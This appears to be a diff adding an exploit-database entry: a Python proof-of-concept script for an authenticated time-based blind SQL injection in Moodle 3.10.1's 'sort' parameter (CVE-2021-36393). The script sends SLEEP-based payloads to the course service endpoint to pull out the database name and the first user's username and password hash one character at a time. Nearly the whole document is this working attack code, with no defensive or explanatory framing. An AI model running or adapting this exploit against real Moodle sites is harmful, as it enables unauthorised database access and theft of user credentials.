@@ -1,0 +1,81 @@
+id: 39548
+date: 04/12/2024
+title: Moodle 3.10.1 - Authenticated Blind Time-Based SQL Injection - (sort) parameter Exploit
+author: Julio Ángel Ferrari
+cves: CVE-2021-36393
+
+# Exploit Title: Moodle Authenticated Time-Based Blind SQL Injection - "sort" Parameter
+# Exploit Author: Julio Ángel Ferrari (Aka. T0X1Cx)
+# Vendor Homepage: https://moodle.org/
+# Software Link: 
+# Version: 3.10.1
+# Tested on: Linux
+# CVE : CVE-2021-36393
+
+import requests
+import string
+from termcolor import colored
+
+# Request details
+URL = "http://127.0.0.1:8080/moodle/lib/ajax/service.php?sesskey=ZT0E6J0xWe&info=core_course_get_enrolled_courses_by_timeline_classification"
+HEADERS = {
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "Content-Type": "application/json",
+    "X-Requested-With": "XMLHttpRequest",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36",
+    "Origin": "http://127.0.0.1:8080",
+    "Referer": "http://127.0.0.1:8080/moodle/my/",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Cookie": "MoodleSession=5b1rk2pfdpbcq2i5hmmern1os0",
+    "Connection": "close"
+}
+
+# Characters to test
+characters_to_test = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$^&*()-_=+[]{}|;:'\",.<>?/"
+
+def test_character(payload):
+    response = requests.post(URL, headers=HEADERS, json=[payload])
+    return response.elapsed.total_seconds() >= 3
+
+def extract_value(column, label):
+    base_payload = {
+        "index": 0,
+        "methodname": "core_course_get_enrolled_courses_by_timeline_classification",
+        "args": {
+            "offset": 0,
+            "limit": 0,
+            "classification": "all",
+            "sort": "",
+            "customfieldname": "",
+            "customfieldvalue": ""
+        }
+    }
+
+    result = ""
+    for _ in range(50):  # Assumes a maximum of 50 characters for the value
+        character_found = False
+        for character in characters_to_test:
+            if column == "database()":
+                base_payload["args"]["sort"] = f"fullname OR (database()) LIKE '{result + character}%' AND SLEEP(3)"
+            else:
+                base_payload["args"]["sort"] = f"fullname OR (SELECT {column} FROM mdl_user LIMIT 1 OFFSET 0) LIKE '{result + character}%' AND SLEEP(3)"
+            
+            if test_character(base_payload):
+                result += character
+                print(colored(f"{label}: {result}", 'red'), end="\r")
+                character_found = True
+                break
+
+        if not character_found:
+            break
+
+    # Print the final result
+    print(colored(f"{label}: {result}", 'red'))
+
+if __name__ == "__main__":
+    extract_value("database()", "Database")
+    extract_value("username", "Username")
+    extract_value("password", "Password")
+
+#  0day.today [2024-04-14]  #
